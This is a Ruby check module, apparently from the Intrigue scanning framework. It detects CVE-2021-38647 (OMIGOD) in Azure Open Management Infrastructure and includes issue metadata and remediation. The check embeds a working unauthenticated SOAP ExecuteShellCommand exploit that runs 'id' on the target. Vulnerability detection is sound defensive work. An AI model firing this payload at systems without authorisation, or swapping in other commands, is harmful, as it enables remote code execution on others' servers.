
module Intrigue

    module Issue
      class AzureCve202138647 < BaseIssue
        def self.generate(instance_details={})
        {
          added: "2021-09-17",
          name: "azure_open_management_cve_2021_38647",
          pretty_name: "Azure Open Management Infrastructure Remote Code Execution Vulnerability (CVE-2021-38647)",
          identifiers: [
            { type: "CVE", name: "CVE-2021-38647" }
          ],
          severity: 1,
          status: "confirmed",
          category: "vulnerability",
          description: "A remote code execution vulnerability in Microsoft Azure Open Management Infrastructure has been identified. Successful exploitation allows attackes to execute arbitrary commands and compromise the entire server.",
          remediation: "Disable public access to the Open Management Interface, typically on tcp ports 1270, 5985, and 5986.",
          affected_software: [
            { :vendor => "Microsoft", :product => "Azure"}
          ],
          affected_ports: [
            {:protocol => "tcp", :port_number => 1270},
            {:protocol => "tcp", :port_number => 5985},
            {:protocol => "tcp", :port_number => 5986}
          ],
          references: [
            { type: "description", uri: "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-38647" },
            { type: "description", uri: "https://nvd.nist.gov/vuln/detail/CVE-2021-38647"},
            { type: "description", uri: "https://www.rapid7.com/blog/post/2021/09/15/omigod-how-to-automatically-detect-and-fix-microsoft-azures-new-omi-vulnerability/"},
            { type: "exploit", uri: "https://github.com/Immersive-Labs-Sec/cve-2021-38647"},
          ],
          authors: ["shpendk", "LucidUnicorn"]
        }.merge!(instance_details)
        end

      end
    end


    module Task
      class AzureCve202138647 < BaseCheck
        def self.check_metadata
          {
            allowed_types: ["Uri", "NetworkService"],
            example_entities: [{"type" => "Uri", "details" => {"name" => "https://intrigue.io"}}],
            allowed_options: []
          }
        end

        def check
          # get entity details
          if _get_entity_type_string == "Uri"
            url = _get_entity_name
            hostname = URI.parse(url).host
            port = URI.parse(url).port
          elsif _get_entity_type_string == "NetworkService"
            hostname = _get_entity_detail "ip_address"
            port = _get_entity_detail "port"
            url = "https://#{hostname}:#{port}"
          else
            _log_error "Unsupported entity type"
            return nil
          end
          
          headers={
                "Content-Type": "application/soap+xml",
          }

          body = <<-EXPLOIT
<s:Envelope
  xmlns:s="http://www.w3.org/2003/05/soap-envelope"
  xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
  xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration"
  xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema"
  xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
  xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"
  >
<s:Header>
  <a:To>HTTP://#{hostname}:#{port}/wsman/</a:To>
  <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
  <a:ReplyTo>
    <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
  </a:ReplyTo>
  <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
  <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
  <a:MessageID>uuid:8c2f6345-65b9-47fd-9d14-647b537a0e83</a:MessageID>
  <w:OperationTimeout>PT1M30S</w:OperationTimeout>
  <w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
  <p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>
  <w:OptionSet s:mustUnderstand="true"/>
  <w:SelectorSet>
    <w:Selector Name="__cimnamespace">root/scx</w:Selector>
  </w:SelectorSet>
</s:Header>
<s:Body>
  <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
    <p:command>id</p:command>
    <p:timeout>0</p:timeout>
  </p:ExecuteShellCommand_INPUT>
</s:Body>
</s:Envelope>
EXPLOIT
          _log "Making exploitation request."
          res = http_request :post , url, nil, headers, body, true, 60
          _log "Got response! Parsing data"
          stdout = res.body_utf8[/<p:StdOut>(.*)<\/p:StdOut>/,1]
          stderr = res.body_utf8[/<p:StdErr>(.*)<\/p:StdErr>/,1]
          if stdout && stderr
            _log "Target is vulnerable! Creating issue."
            return {stdout: stdout, stderr: stderr}
          else
            _log "Target appears not vulnerable."
          end
        end

      end
    end

  end